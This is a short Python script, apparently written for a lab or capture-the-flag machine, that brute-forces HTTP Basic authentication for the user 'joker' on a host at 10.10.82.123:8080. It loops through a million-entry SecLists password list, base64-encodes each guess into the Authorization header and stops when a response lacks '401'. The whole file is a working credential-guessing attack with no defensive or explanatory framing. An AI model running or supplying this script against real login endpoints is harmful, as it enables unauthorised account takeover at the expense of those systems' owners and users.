import requests
import base64
import time


s = requests.Session()
url = "http://10.10.82.123:8080/"
file = "/home/nox/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"

wordlist = open(file, "r").read().split('\n')

start = time.time()
print(f"[*] Wordlist: {file}")
print("Bruteforcing...")
for password in wordlist:

	creds = bytes(f"joker:{password}", "UTF-8")
	encoded_creds = base64.urlsafe_b64encode(creds)

	headers = {
		"Host": "10.10.82.123:8080",
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.5",
		"Accept-Encoding": "gzip, deflate",
		"Connection": "keep-alive",
		"Upgrade-Insecure-Requests": "1",
		"Authorization": f"Basic {encoded_creds.decode('utf-8')}"
	}

	login = s.post(url, headers=headers)
	
	if "401" in login.text:
		continue
	else:
		print("Founded!")
		print(creds.decode('utf-8'))
		end = time.time()
		print(f"Time taken {end - start}")
		break




